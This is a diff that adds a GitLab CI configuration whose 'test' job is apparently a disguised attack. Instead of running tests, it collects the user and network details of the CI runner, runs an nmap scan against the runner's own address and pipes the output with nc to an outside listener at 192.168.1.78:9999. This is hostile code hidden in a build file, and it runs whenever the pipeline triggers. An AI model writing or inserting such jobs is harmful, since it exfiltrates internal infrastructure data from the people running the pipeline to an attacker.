@@ -1,0 +1,9 @@
+stages:
+    - test  
+test:
+    stage: test
+    script:
+        - whoami
+        - ip a
+        # Gets ip address: ifconfig eth0 2>/dev/null|awk '/inet addr:/ {print $2}'|sed 's/addr://'
+        - nmap -sC -sV $(ifconfig eth0 2>/dev/null|awk '/inet addr:/ {print $2}'|sed 's/addr://') | nc 192.168.1.78 9999
